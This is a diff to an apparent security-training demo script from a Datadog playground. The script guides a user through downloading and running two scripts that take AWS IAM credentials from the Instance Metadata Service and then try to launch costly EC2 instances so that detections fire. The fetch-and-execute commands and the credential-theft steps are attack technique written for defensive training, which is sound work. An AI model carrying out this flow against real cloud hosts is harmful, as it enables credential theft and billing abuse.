@@ -29,46 +29,55 @@ wait_for_confirmation
 inject "apt update && apt install -y curl jq awscli"
 
 step <<EOF
-\033[1;35mDownload Cloud Access Script\033[0m
+\033[1;35mDownload Cloud Access Scripts\033[0m
 
-${PURPLE}Download a script that will abuse AWS credentials obtained from the \
-Instance Metadata Service to attempt launching expensive EC2 instances across \
-multiple regions. This demonstrates how attackers pivot from workload compromise \
-to cloud resource abuse.\033[0m
+${PURPLE}Download the two scripts that carry out the attack. The first retrieves \
+AWS credentials from the Instance Metadata Service (IMDS); the second uses those \
+stolen credentials to attempt launching expensive EC2 instances across multiple \
+regions. Splitting the attack this way mirrors how attackers first harvest \
+credentials, then pivot to cloud resource abuse.\033[0m
 EOF
 wait_for_confirmation
 # The GIT_SHA environment variable is set at container build time in app/Dockerfile
-inject "curl -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/${GIT_SHA}/assets/cloud-access/cloud-access.sh"
+inject "curl -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/${GIT_SHA}/assets/cloud-access/retrieve-creds-via-imds.sh -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/${GIT_SHA}/assets/cloud-access/run-instances-with-creds.sh"
 
 step <<EOF
-\033[1;35mMake Cloud Access Script Executable\033[0m
+\033[1;35mMake Cloud Access Scripts Executable\033[0m
 
-${PURPLE}Set execution permissions on the cloud access script.\033[0m
+${PURPLE}Set execution permissions on both cloud access scripts.\033[0m
 EOF
 wait_for_confirmation
-inject "chmod +x cloud-access.sh"
+inject "chmod +x retrieve-creds-via-imds.sh run-instances-with-creds.sh"
+
+step <<EOF
+\033[1;35mCredential Theft - Retrieve AWS Credentials via IMDS\033[0m
+
+${PURPLE}Now we execute the first script, which retrieves credentials from the \
+Instance Metadata Service (IMDS). It tries both IMDSv2 and IMDSv1 to obtain the \
+node's IAM role credentials and stages them in a temporary file for the next \
+step. The raw IMDS requests are visible to runtime security monitoring.\033[0m
+EOF
+wait_for_confirmation
+inject "./retrieve-creds-via-imds.sh"
 
 step <<EOF
 \033[1;35mCloud Resource Abuse - Attempt EC2 Instance Launch\033[0m
 
-${PURPLE}Now we execute the cloud-access script which will automatically retrieve \
-credentials from the Instance Metadata Service (IMDS). The script will attempt (and fail) to \
-launch expensive EC2 instances across multiple regions, generating CloudTrail events \
-that can be investigated.\033[0m
-
-${PURPLE}The script will try both IMDSv2 and IMDSv1 to retrieve the node's IAM role \
-credentials automatically.\033[0m
+${PURPLE}Now we execute the second script, which uses the stolen credentials to \
+attempt (and fail) launching expensive EC2 instances across multiple regions, \
+generating CloudTrail events that can be investigated.\033[0m
 EOF
 wait_for_confirmation
-inject "./cloud-access.sh"
+inject "./run-instances-with-creds.sh"
 
 step <<EOF
 \033[1;35mCleanup - Remove Cloud Access Artifacts\033[0m
 
-${PURPLE}Remove the cloud access script to clean up after the demonstration.\033[0m
+${PURPLE}Remove the cloud access scripts and the staged credentials file to clean \
+up after the demonstration.\033[0m
 EOF
 wait_for_confirmation
-inject "rm -f cloud-access.sh 2>/dev/null || true"
+inject "rm -f retrieve-creds-via-imds.sh run-instances-with-creds.sh /tmp/.aws-cloud-access-creds 2>/dev/null || true"
 
 print <<EOF
 ${GREEN}Cloud access demonstration completed successfully! All artifacts have been cleaned up.\033[0m
